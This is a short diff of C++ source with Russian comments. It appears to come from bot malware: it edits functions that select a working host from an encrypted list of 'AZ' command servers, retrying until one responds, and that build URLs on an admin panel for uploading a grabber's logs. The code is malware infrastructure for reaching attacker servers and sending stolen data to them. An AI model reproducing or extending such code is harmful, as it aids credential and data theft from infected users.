@@ -17,6 +17,7 @@
 
 #include "BotCore.h"
 #include "Config.h"
+#include "AzConfig.h"
 #include "Utils.h"
 #include "BotHosts.h"
 #include "BotDef.h"
@@ -130,9 +131,19 @@ bool IsAzHost(const char* Host)
 // GetAzHost - Функция возвращает первый рабочий хост
 // из массива хостов системы AZ
 //----------------------------------------------------
-string GetAzHost()
+string GetAzHost(bool Wait)
 {
-	return GetActiveHostFromBuf2(GetAzHostsBuf(), 0, AZCONFIG_PARAM_ENCRYPTED_HOSTS);
+	string Host;
+	do
+	{
+		Host = GetActiveHostFromBuf2(GetAzHostsBuf(), 0, AZCONFIG_PARAM_ENCRYPTED_HOSTS);
+		if (Wait && Host.IsEmpty())
+			pSleep(500);
+		else
+			break;
+	}
+	while(true);
+	return Host;
 }
 //-----------------------------------------------------------------------------
 
@@ -159,6 +170,7 @@ string GetAzURL(const char*  Path)
 //  отправки лога грабера
 //------------------------------------------------------
 // Строка определена в модуле StrConsts.cpp
+#ifdef USE_AZ_HOSTS
 extern CSSTR EStrAzGrabberPathMask[];
 
 string GetAzGrabberURLPath(const string& SystemName,  const char* Action)
@@ -170,9 +182,6 @@ string GetAzGrabberURLPath(const string& SystemName,  const char* Action)
 	return Path;
 }
 
-
-
-
 //------------------------------------------------------
 //  GetAzGrabberURL
 //  Функция возвращает адрес в админке
@@ -183,7 +192,7 @@ string GetAzGrabberURL(const string& SystemName,  const char* Action)
 	return GetAzURL(GetAzGrabberURLPath(SystemName, Action).t_str());
 }
 
-
+#endif
 
 
 
